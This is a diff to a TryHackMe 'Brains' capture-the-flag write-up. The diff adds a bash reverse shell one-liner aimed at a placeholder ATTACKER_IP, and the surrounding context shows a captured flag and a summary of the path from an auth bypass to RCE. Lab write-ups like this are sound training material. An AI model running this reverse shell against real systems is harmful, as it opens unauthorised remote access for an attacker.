@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/brains/","tags":["#tryhackme","brains","offensivesecurity","ethicalhacking","writeup","#authenticationbypass"],"created":"2026-03-31T19:25:54.559+02:00","updated":"2026-03-31T23:05:30.201+02:00","dg-note-properties":{"tags":["#tryhackme","brains","offensivesecurity","ethicalhacking","writeup","#authenticationbypass"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/brains/","tags":["#tryhackme","brains","offensivesecurity","ethicalhacking","writeup","#authenticationbypass"],"created":"2026-03-31T19:25:54.559+02:00","updated":"2026-04-02T14:23:32.101+02:00","dg-note-properties":{"tags":["#tryhackme","brains","offensivesecurity","ethicalhacking","writeup","#authenticationbypass"]}}
 ---
 
 ![](/img/user/Attachments/1_IpVNsJXvAdv12YJ82oxO3A-2241369949.png)
@@ -109,6 +109,9 @@ Lets locate the users on the system
 
 Lets identify if **netcat** is on the system since this is an unstable shell and the connection might get dropped and otherwise is annoying to work with. 
 
+Spawn a reverse shell 
+`bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1`
+
 ![](/img/user/Attachments/identify-nc.png)
 
 
@@ -120,9 +123,10 @@ Now grabbing the reverse shell in netcat
 `THM{faa9bac345709b6620a6200b484c7594}`
 ![](/img/user/Attachments/pwned.png)
 
-
-
-
 ## Attack Pattern Analysis
 
 Nmap > apache server vulnerable to auth bypass > PoC exploit from github > RCE & Admin access to web interface > 
+
+
+## Forensic Analysis
+
